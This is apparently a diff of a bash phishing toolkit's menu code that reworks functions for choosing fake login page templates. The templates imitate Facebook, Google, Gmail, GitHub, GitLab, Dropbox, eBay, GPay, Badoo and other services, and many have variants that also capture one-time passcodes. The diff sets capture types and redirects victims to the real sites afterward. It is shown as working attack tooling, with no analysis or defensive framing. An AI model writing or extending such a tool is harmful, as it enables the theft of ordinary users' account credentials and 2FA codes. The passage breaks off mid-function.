-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_badoo(){
+        site_name="Badoo"
+        dgfname="badoo"
+        rdurl="badoo.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="badoo"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="badoo/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_badoo; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="badoo"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="badoo/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_badoo; };;
+        esac
 }
 #clashofclans
-site_clashofclans(){
-website="clashofclans"
-rdurl="clashofclans.com/"
-siname="Clash Of Clans"
-dgfname="clashofclans"
-sitype="Default"
-tunnelmenu
+login_clashofclans(){
+        site_id="clashofclans"
+        rdurl="clashofclans.com/"
+        site_name="Clash Of Clans"
+        dgfname="clashofclans"
+        capture_type="NOTP"
+        site_template="Default"
 }
 #date
-site_date(){
-siname="Date (Multiple phish)"
-rdurl="date.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} Template 1 - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} Template 1 - WITH OTP ${NC}"
-echo -e "${BLUE}[03]${CYAN} Template 2 - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[04]${CYAN} Template 2 - WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_date(){
+        site_name="Date(Multiple phish)"
+        rdurl="date.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} Template 1 - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} Template 1 - WITH OTP ${NC}"
+        echo -e "${BLUE}[03]${CYAN} Template 2 - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[04]${CYAN} Template 2 - WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="date1"
-                dgfname="date1"
-                sitype="1"
-                tunnelmenu;;
-        2 | 02)
-                website="date1/otp"
-                dgfname="date1"
-                sitype="1/OTP"
-                tunnelmenu;;
-	3 | 03)
-                website="date2"
-                dgfname="date2"
-                sitype="2"
-                tunnelmenu;;
-        4 | 04)
-                website="date2/otp"
-                dgfname="date2"
-                sitype="2/OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_date; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="date1"
+                        dgfname="date1"
+                        capture_type="NOTP"
+                        site_template="1" ;;
+                2 | 02)
+                        site_id="date1/otp"
+                        capture_type="POTP"
+                        dgfname="date1"
+                        site_template="1/OTP" ;;
+                3 | 03)
+                        site_id="date2"
+                        dgfname="date2"
+                        capture_type="NOTP"
+                        site_template="2" ;;
+                4 | 04)
+                        site_id="date2/otp"
+                        capture_type="POTP"
+                        dgfname="date2"
+                        site_template="2/OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_date; };;
+        esac
 }
 #devianart
-site_devianart(){
-siname="Devian Art"
-dgfname="devianart"
-rdurl="www.deviantart.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_devianart(){
+        site_name="Devian Art"
+        dgfname="devianart"
+        rdurl="www.deviantart.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="devianart"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="devianart/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_airtelxstream; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="devianart"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="devianart/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_airtelxstream; };;
+        esac
 }
 #dropbox
-site_dropbox(){
-website="dropbox"
-rdurl="www.dropbox.com/"
-siname="Drop Box"
-dgfname="dropbox"
-tunnelmenu
+login_dropbox(){
+        site_id="dropbox"
+        rdurl="www.dropbox.com/"
+        site_name="Drop Box"
+        dgfname="dropbox"
+        capture_type="NOTP"
+        site_template="Default"
 }
 #ebay
-site_ebay(){
-siname="Ebay"
-dgfname="ebay"
-rdurl="www.ebay.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
--echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_ebay(){
+        site_name="Ebay"
+        dgfname="ebay"
+        rdurl="www.ebay.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        -echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="ebay"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="ebay/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_ebay; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="ebay"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="ebay/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_ebay; };;
+        esac
 }
 #facebook
-site_facebook(){
-siname="Facebook"
-rdurl="www.facebook.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} Facebook - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} Facebook - WITH OTP ${NC}"
-echo -e "${BLUE}[03]${CYAN} Facebook Poll - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[04]${CYAN} Facebook Poll - WITH OTP ${NC}"
-echo -e "${BLUE}[05]${CYAN} Facebook Security - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[06]${CYAN} Facebook Security- WITH OTP ${NC}"
-echo -e "${BLUE}[07]${CYAN} Facebook Standard- WITHOUT OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_facebook(){
+        site_name="Facebook"
+        rdurl="www.facebook.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} Facebook - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} Facebook - WITH OTP ${NC}"
+        echo -e "${BLUE}[03]${CYAN} Facebook Poll - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[04]${CYAN} Facebook Poll - WITH OTP ${NC}"
+        echo -e "${BLUE}[05]${CYAN} Facebook Security - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[06]${CYAN} Facebook Security- WITH OTP ${NC}"
+        echo -e "${BLUE}[07]${CYAN} Facebook Standard- WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="facebook"
-                sitype="Default"
-                dgfname="facebook"
-                tunnelmenu;;
-        2 | 02)
-                website="facebook/otp"
-                sitype="OTP"
-                dgfname="facebook"
-                tunnelmenu;;
-	3 | 03)
-                website="fb_poll"
-                rdurl="result.html"
-                sitype="Poll"
-                dgfname="fb_poll"
-                tunnelmenu;;
-        4 | 04)
-                website="fb_poll/otp"
-                rdurl="result.html"
-                sitype="Poll/OTP"
-                dgfname="fb_poll"
-                tunnelmenu;;
-	5 | 05)
-                website="fb_security"
-                sitype="Security"
-                dgfname="fb_security"
-                tunnelmenu;;
-        6 | 06)
-                website="fb_security/otp"
-                sitype="Security/OTP"
-                dgfname="fb_security"
-                tunnelmenu;;
-	7 | 07)
-                website="fb_standard"
-                sitype="Standard"
-                dgfname="fb_standard"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_facebook; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="facebook"
+                        capture_type="NOTP"
+                        site_template="Default"
+                        dgfname="facebook" ;;
+                2 | 02)
+                        site_id="facebook/otp"
+                        capture_type="POTP"
+                        site_template="OTP"
+                        dgfname="facebook" ;;
+                3 | 03)
+                        site_id="fb_poll"
+                        capture_type="NOTP"
+                        rdurl="result.html"
+                        site_template="Poll"
+                        dgfname="fb_poll" ;;
+                4 | 04)
+                        site_id="fb_poll/otp"
+                        capture_type="POTP"
+                        rdurl="result.html"
+                        site_template="Poll/OTP"
+                        dgfname="fb_poll" ;;
+                5 | 05)
+                        site_id="fb_security"
+                        capture_type="NOTP"
+                        site_template="Security"
+                        dgfname="fb_security" ;;
+                6 | 06)
+                        site_id="fb_security/otp"
+                        capture_type="POTP"
+                        site_template="Security/OTP"
+                        dgfname="fb_security" ;;
+                7 | 07)
+                        site_id="fb_standard"
+                        capture_type="NOTP"
+                        site_template="Standard"
+                        dgfname="fb_standard" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_facebook; };;
+        esac
 }
 #flipcart
-site_flipcart(){
-siname="Flipcart"
-dgfname="flipcart"
-rdurl="www.flipcart.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_flipcart(){
+        site_name="Flipcart"
+        dgfname="flipcart"
+        rdurl="www.flipcart.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="flipcart"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="flipcart/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_flipcart; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="flipcart"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="flipcart/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                                { sleep 1; banner; login_flipcart; };;
+        esac
 }
 #freefire
-site_freefire(){
-website="freefire"
-dgfname="freefire"
-rdurl="ff.garena.com"
-siname="Free Fire"
-tunnelmenu
+login_freefire(){
+        site_id="freefire"
+        dgfname="freefire"
+        rdurl="ff.garena.com"
+        site_name="Free Fire"
+        capture_type="NOTP"
+        site_template="Default"
 }
 #github
-site_github(){
-siname="GitHub"
-rdurl="www.github.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} Default - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
-echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[04]${CYAN} Advanced - WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_github(){
+        site_name="GitHub"
+        rdurl="www.github.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} Default - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
+        echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[04]${CYAN} Advanced - WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="github"
-                sitype="Default"
-                dgfname="github"
-                tunnelmenu;;
-        2 | 02)
-                website="github/otp"
-                sitype="OTP"
-                dgfname="github"
-                tunnelmenu;;
-	3 | 03)
-                website="github_advanced"
-                sitype="Advanced"
-                dgfname="github_advanced"
-                tunnelmenu;;
-        4 | 04)
-                website="github_advanced/otp"
-                sitype="Advanced/OTP"
-                dgfname="github_advanced"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_github; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="github"
+                        capture_type="NOTP"
+                        site_template="Default"
+                        dgfname="github" ;;
+                2 | 02)
+                        site_id="github/otp"
+                        capture_type="POTP"
+                        site_template="OTP"
+                        dgfname="github" ;;
+                3 | 03)
+                        site_id="github_advanced"
+                        capture_type="NOTP"
+                        site_template="Advanced"
+                        dgfname="github_advanced" ;;
+                4 | 04)
+                        site_id="github_advanced/otp"
+                        capture_type="POTP"
+                        site_template="Advanced/OTP"
+                        dgfname="github_advanced" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_github; };;
+        esac
 }
 #gitlab
-site_gitlab(){
-siname="GitLab"
-rdurl="www.gitlab.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} Default - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
-echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[04]${CYAN} Advanced - WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_gitlab(){
+        site_name="GitLab"
+        rdurl="www.gitlab.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} Default - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
+        echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[04]${CYAN} Advanced - WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-	1 | 01)
-                website="gitlab"
-                sitype="Default"
-                dgfname="gitlab"
-                tunnelmenu;;
-        2 | 02)
-                website="gitlab/otp"
-                sitype="OTP"
-                dgfname="gitlab"
-                tunnelmenu;;
-        3 | 03)
-                website="gitlab_advanced"
-                sitype="Advanced"
-                dgfname="gitlab_advanced"
-                tunnelmenu;;
-        4 | 04)
-                website="gitlab_advanced/otp"
-                sitype="OTP"
-                dgfname="gitlab_advanced"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_gitlab; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="gitlab"
+                        capture_type="NOTP"
+                        site_template="Default"
+                        dgfname="gitlab" ;;
+                2 | 02)
+                        site_id="gitlab/otp"
+                        capture_type="POTP"
+                        site_template="OTP"
+                        dgfname="gitlab" ;;
+                3 | 03)
+                        site_id="gitlab_advanced"
+                        capture_type="NOTP"
+                        site_template="Advanced"
+                        dgfname="gitlab_advanced" ;;
+                4 | 04)
+                        site_id="gitlab_advanced/otp"
+                        capture_type="POTP"
+                        site_template="OTP"
+                        dgfname="gitlab_advanced" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_gitlab; };;
+        esac
 }
 #gmail
-site_gmail(){
-siname="Gmail"
-dgfname="gmail"
-rdurl="www.gmail.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_gmail(){
+        site_name="Gmail"
+        dgfname="gmail"
+        rdurl="www.gmail.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="gmail"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="gmail/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_gmail; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="gmail"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="gmail/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_gmail; };;
+        esac
 }
 #google
-site_google(){
-siname="Google"
-rdurl="www.gmail.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} Google - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} Google - WITH OTP ${NC}"
-echo -e "${BLUE}[03]${CYAN} Google Poll - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[04]${CYAN} Google Poll - WITH OTP ${NC}"
-echo -e "${BLUE}[05]${CYAN} Google old - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[06]${CYAN} Google old - WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_google(){
+        site_name="Google"
+        rdurl="www.gmail.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} Google - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} Google - WITH OTP ${NC}"
+        echo -e "${BLUE}[03]${CYAN} Google Poll - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[04]${CYAN} Google Poll - WITH OTP ${NC}"
+        echo -e "${BLUE}[05]${CYAN} Google old - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[06]${CYAN} Google old - WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="google"
-                sitype="Default"
-                dgfname="google"
-                tunnelmenu;;
-        2 | 02)
-                website="google/otp"
-                sitype="OTP"
-                dgfname="google"
-                tunnelmenu;;
-        3 | 03)
-                website="google_poll"
-                rdurl="result.html"
-                sitype="Poll"
-                dgfname="google_poll"
-                tunnelmenu;;
-        4 | 04)
-                website="google_poll/otp"
-                rdurl="result.html"
-                sitype="Poll/OTP"
-                dgfname="google_poll"
-                tunnelmenu;;
-        5 | 05)
-                website="google_old"
-                sitype="Old"
-                dgfname="google_old"
-                tunnelmenu;;
-	6 | 06)
-		website="google_old/otp"
-                sitype="Old/OTP"
-                dgfname="google_old"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_google; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="google"
+                        capture_type="NOTP"
+                        site_template="Default"
+                        dgfname="google" ;;
+                2 | 02)
+                        site_id="google/otp"
+                        capture_type="POTP"
+                        site_template="OTP"
+                        dgfname="google" ;;
+                3 | 03)
+                        site_id="google_poll"
+                        capture_type="NOTP"
+                        rdurl="result.html"
+                        site_template="Poll"
+                        dgfname="google_poll" ;;
+                4 | 04)
+                        site_id="google_poll/otp"
+                        capture_type="POTP"
+                        rdurl="result.html"
+                        site_template="Poll/OTP"
+                        dgfname="google_poll" ;;
+                5 | 05)
+                        site_id="google_old"
+                        capture_type="NOTP"
+                        site_template="Old"
+                        dgfname="google_old" ;;
+                6 | 06)
+                        site_id="google_old/otp"
+                        capture_type="POTP"
+                        site_template="Old/OTP"
+                        dgfname="google_old" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_google; };;
+        esac
 }
 #gpay
-site_gpay(){
-siname="Gpay"
-dgfname="gpay"
-rdurl="pay.google.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_gpay(){
+        site_name="Gpay"
+        dgfname="gpay"
+        rdurl="pay.google.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="gpay"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="gpay/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_gpay; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="gpay"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="gpay/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
